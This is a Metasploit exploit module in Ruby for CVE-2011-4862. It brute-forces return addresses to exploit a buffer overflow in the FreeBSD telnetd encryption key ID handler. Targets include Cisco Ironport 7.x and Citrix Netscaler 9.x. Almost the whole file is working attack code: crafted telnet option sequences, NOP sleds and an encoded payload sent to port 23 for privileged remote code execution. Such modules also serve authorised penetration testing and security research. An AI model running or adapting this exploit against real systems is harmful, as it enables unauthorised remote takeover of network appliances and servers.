##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Brute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FreeBSD based telnetd encrypt_key_id brute force',
      'Description'    => %q{
          This module exploits a buffer overflow in the encryption option handler of the
        FreeBSD telnet service.
      },
      'Author'         => [ 'Nenad Stojanovski <nenad.stojanovski[at]gmail.com>' ],
      'References'     =>
        [
          ['BID', '51182'],
          ['OSVDB', '78020'],
          ['CVE', '2011-4862'],
          ['URL', 'http://www.exploit-db.com/exploits/18280/']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'Space'    => 128,
          'BadChars' => "\x00",
        },
      'Platform'       => [ 'bsd' ],
      'Targets'        =>
      [
        #
        # specific targets
        #
        [ 'Cisco Ironport 7.x Bruteforce',
            {
              'Bruteforce'   =>
                {

                  'Start' => { 'Ret' => 0x0805cffd },
                  'Stop'  => { 'Ret' => 0x0805aa00 },
                  'Step'  => 8
                }
            }
        ],

        [ 'Citrix Netscaler 9.x',
          {
              'Bruteforce'   =>
                {

                  'Start' => { 'Ret' => 0x0805bffd },
                  'Stop'  => { 'Ret' => 0x08059000 },
                  'Step'  => 8
                }
          }
        ],

        [ 'Other FreeBSD based targets',
          {
              'Bruteforce'   =>
                {

                  'Start' => { 'Ret' => 0x0805fffd },
                  'Stop'  => { 'Ret' => 0x08050000 },
                  'Step'  => 8
                }
          }
        ],


      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Dec 23 2011'))

    register_options(
      [
        Opt::RPORT(23),
      ], self.class )
  end

  def brute_exploit(addrs)
    curr_ret = addrs['Ret']
    begin
      connect

      sock.get_once
      print_status('Initiate encryption mode ...')

      req =  ''
      req << "\xff\xfa\x26\x00\x01\x01\x12\x13"
      req << "\x14\x15\x16\x17\x18\x19\xff\xf0"
      req << "\x00"

      sock.put(req)
      sock.get_once
      req = ''
      print_status("Trying return address 0x%.8x..." % curr_ret )
      print_status('Sending first payload ...')

      req << "\xff\xfa\x26\x07"
      req << "\x00"
      req << make_nops(71)
      penc = payload.encoded.gsub("\xff", "\xff\xff")
      req << [curr_ret].pack('V')
      req << [curr_ret].pack('V')

      req << make_nops(128)
      req << penc
      req << "\x90\x90\x90\x90"
      req << "\xff\xf0"
      req << "\x00"

      sock.put(req)
      sock.get_once
      print_status('Sending second payload ...')
      sock.put(req)

      disconnect
      handler
    rescue
    end
  end

end
